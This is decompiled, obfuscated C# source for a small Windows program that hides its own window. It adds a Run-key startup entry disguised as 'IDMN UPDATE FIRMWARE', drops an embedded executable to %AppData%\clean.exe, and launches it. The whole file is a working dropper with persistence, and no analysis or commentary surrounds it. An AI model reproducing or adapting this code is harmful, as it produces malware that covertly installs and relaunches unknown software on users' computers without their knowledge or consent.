using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace RunIt;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> list_0 = Delegate53.smethod_0();

	private IContainer icontainer_0;

	public Computer computer_0;

	public string ERsf;

	public string RGES;

	public FileInfo LOCALISATION;

	public Form1()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		Delegate16.smethod_0(this, Form1_Load);
		smethod_0(this);
		computer_0 = new Computer();
		ERsf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		RGES = "IDMN UPDATE FIRMWARE";
		LOCALISATION = new FileInfo(Delegate95.smethod_0(Delegate10.smethod_0(Environment.SpecialFolder.ApplicationData), "\\clean.exe"));
		method_0();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			List<WeakReference> list = default(List<WeakReference>);
			bool flag = default(bool);
			int num = default(int);
			int num2 = default(int);
			int num3 = default(int);
			int num5 = default(int);
			WeakReference weakReference = default(WeakReference);
			bool flag2 = default(bool);
			try
			{
				list = list_0;
				Delegate101.smethod_0(list);
				try
				{
					if (flag = Delegate24.smethod_0(list_0) == Delegate129.smethod_0(list_0))
					{
						num = 0;
						num2 = Delegate24.smethod_0(list_0) - 1;
						num3 = 0;
						while (true)
						{
							int num4 = num3;
							num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							weakReference = Delegate76.smethod_0(list_0, num3);
							if (flag = Delegate52.smethod_0(weakReference))
							{
								if (flag2 = num3 != num)
								{
									Delegate43.smethod_0(list_0, num, Delegate76.smethod_0(list_0, num3));
								}
								num++;
							}
							num3++;
						}
						Delegate119.smethod_0(list_0, num, Delegate24.smethod_0(list_0) - num);
						Delegate65.smethod_0(list_0, Delegate24.smethod_0(list_0));
					}
					Delegate87.smethod_0(list_0, Delegate15.smethod_0(Delegate26.smethod_0(object_0)));
				}
				finally
				{
					Delegate96.smethod_0(list);
				}
			}
			catch (Exception exception_)
			{
				Class9.smethod_33(exception_, object_0, num, num3, weakReference, list, num2, flag, flag2, num5);
				throw;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		try
		{
			try
			{
				if (flag = ((disposing && icontainer_0 != null) ? true : false))
				{
					Delegate13.smethod_0(icontainer_0);
				}
			}
			finally
			{
				Delegate111.smethod_0(this, disposing);
			}
		}
		catch (Exception exception_)
		{
			Class9.smethod_27(exception_, this, disposing, flag);
			throw;
		}
	}

	[DebuggerStepThrough]
	private void method_0()
	{
		SizeF sizeF_ = default(SizeF);
		Size size_ = default(Size);
		try
		{
			Delegate41.smethod_0(this);
			Delegate56.smethod_0(ref sizeF_, 6f, 13f);
			Delegate29.smethod_0(this, sizeF_);
			Delegate47.smethod_0(this, (AutoScaleMode)1);
			Delegate59.smethod_0(ref size_, 284, 261);
			Delegate67.smethod_0(this, size_);
			Delegate70.smethod_0(this, "Form1");
			Delegate51.smethod_0(this, "Form1");
			Delegate22.smethod_0(this, bool_0: false);
		}
		catch (Exception exception_)
		{
			SizeF sizeF = default(SizeF);
			Size size = default(Size);
			Class9.smethod_29(exception_, this, sizeF, sizeF_, size, size_);
			throw;
		}
	}

	public void Form1_Load(object sender, EventArgs e)
	{
		Exception object_ = default(Exception);
		Exception object_2 = default(Exception);
		Exception object_3 = default(Exception);
		Exception object_4 = default(Exception);
		string text = default(string);
		bool flag = default(bool);
		try
		{
			Delegate110.smethod_0(this);
			Delegate120.smethod_0(this, bool_0: false);
			Delegate80.smethod_0(this, bool_0: false);
			try
			{
				Delegate8.smethod_0(Delegate77.smethod_0(Delegate94.smethod_0(Delegate82.smethod_0(computer_0)), ERsf, bool_0: true), RGES, Delegate58.smethod_0("\"", Delegate109.smethod_0(LOCALISATION), "\" .."));
			}
			catch (Exception ex)
			{
				Delegate112.smethod_0(ex);
				object_ = ex;
				Delegate44.smethod_0();
			}
			try
			{
				Delegate8.smethod_0(Delegate77.smethod_0(Delegate71.smethod_0(Delegate82.smethod_0(computer_0)), ERsf, bool_0: true), RGES, Delegate58.smethod_0("\"", Delegate109.smethod_0(LOCALISATION), "\" .."));
			}
			catch (Exception ex2)
			{
				Delegate112.smethod_0(ex2);
				object_2 = ex2;
				Delegate44.smethod_0();
			}
			try
			{
				Delegate8.smethod_0(Delegate77.smethod_0(Delegate94.smethod_0(Delegate82.smethod_0(computer_0)), ERsf, bool_0: true), RGES, Delegate58.smethod_0("\"", Delegate109.smethod_0(LOCALISATION), "\" .."));
			}
			catch (Exception ex3)
			{
				Delegate112.smethod_0(ex3);
				object_3 = ex3;
				Delegate44.smethod_0();
			}
			try
			{
				Delegate8.smethod_0(Delegate77.smethod_0(Delegate71.smethod_0(Delegate82.smethod_0(computer_0)), ERsf, bool_0: true), RGES, Delegate58.smethod_0("\"", Delegate109.smethod_0(LOCALISATION), "\" .."));
			}
			catch (Exception ex4)
			{
				Delegate112.smethod_0(ex4);
				object_4 = ex4;
				Delegate44.smethod_0();
			}
			text = Delegate95.smethod_0(Delegate10.smethod_0(Environment.SpecialFolder.ApplicationData), "\\clean.exe");
			if (flag = !Delegate104.smethod_0(text))
			{
				Delegate89.smethod_0(text, Delegate40.smethod_0());
				Delegate49.smethod_0(text);
			}
			Delegate23.smethod_0(this);
		}
		catch (Exception exception_)
		{
			Class9.smethod_33(exception_, this, sender, e, text, object_, object_2, object_3, object_4, flag);
			throw;
		}
	}
}
